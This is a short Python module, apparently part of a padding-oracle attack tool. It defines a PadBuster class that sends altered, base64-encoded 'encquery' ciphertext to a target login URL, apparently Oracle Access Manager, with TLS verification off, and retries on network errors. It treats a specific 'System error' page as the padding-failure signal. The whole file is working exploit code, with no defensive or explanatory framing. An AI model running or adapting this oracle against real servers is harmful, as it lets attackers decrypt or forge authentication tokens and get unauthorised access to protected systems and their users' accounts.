import re
import urllib

from paddingoracle import BadPaddingException, PaddingOracle
from base64 import b64encode
from urllib import quote
import requests
import socket
import time
import logging
from lib.constants import Constants


class PadBuster(PaddingOracle):
    def __init__(self, prefix_message, **kwargs):
        super(PadBuster, self).__init__(**kwargs)
        self._prefix_message = prefix_message
        self.wait = kwargs.get('wait', 2.0)
        self._logger = logging.getLogger(Constants.LOGGER_NAME)

    def oracle(self, data, **kwargs):
        while 1:
            try:
                msg = self._prefix_message.encquery + data
                msg = b64encode(msg)
                url = self._prefix_message.oam_url + "?encquery=" + urllib.quote(
                    msg + '  ' + self._prefix_message.extra_params)

                response = requests.get(url, stream=False, timeout=15, verify=False)
                break
            except (socket.error, requests.exceptions.RequestException):
                self._logger.exception('Retrying request in %.2f seconds...',
                                       self.wait)
                time.sleep(self.wait)
                continue

        self.history.append(response)

        content = response.text
        regex = r'System error.*please contact the Administrator.</p>'
        result = re.findall(regex, content)
        if not result:  # and (response.status_code == 200 or response.status_code == 302):
            self._logger.debug('No padding exception raised on %r', quote(b64encode(data)))
        else:
            raise BadPaddingException
